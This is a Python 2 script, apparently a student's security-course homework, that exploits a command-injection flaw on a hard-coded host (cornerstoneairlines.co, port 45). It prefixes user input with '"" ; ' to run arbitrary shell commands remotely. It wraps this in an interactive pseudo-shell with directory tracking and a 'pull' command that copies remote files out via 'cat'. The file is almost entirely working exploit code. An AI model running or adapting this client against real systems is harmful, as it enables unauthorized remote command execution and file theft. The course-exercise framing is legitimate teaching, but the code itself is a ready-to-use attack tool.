"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import sys
import time

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
		
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		data = s.recv(1024)     # Receives 1024 bytes from IP/Port
		s.send(cmd)   # Send a newline \n at the end of your 
		data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data
		s.close()


if __name__ == '__main__':
	currdir = []
	stri = ""
	while True:
		sys.stdout.write(">")
		command = raw_input()
		if command == "shell":
			currdir.append("/")
			while True:
				for x in currdir:
					stri += x
				sh = raw_input(stri+">")
				if sh == "exit":
					currdir = []
					break
				elif sh[len(sh)-1] == '.':
					currdir.pop()
				elif len(sh) > 5 and sh[0] == 'c' and sh[1] =='d':
					currdir.append(sh.split()[1]+"/")
				elif sh.split()[0] == "ls":
					command = "\"\" ; " + sh + " "+stri + "\n"		
					execute_cmd(command)
				else:
					command = "\"\" ; " + sh.split()[0] + " "+stri+sh.split()[1] + "\n"		
					execute_cmd(command)

				stri = ""
		elif command == "quit":
			break
		elif command == "help":
			print("Help menu\n shell: allows you to use interactive shell \n pull: allows you to download files \n help: shows this menu \n quit: quit the shell")
		elif command.split()[0] == "pull":
			original = sys.stdout
			sys.stdout = open(command.split()[2],'w')
			execute_cmd(" \"\" ; cat " + command.split()[1] + "\n")
			sys.stdout = original
		else:
			print("Help menu\n shell: allows you to use interactive shell \n pull: allows you to download files \n help: shows this menu \n quit: quit the shell")



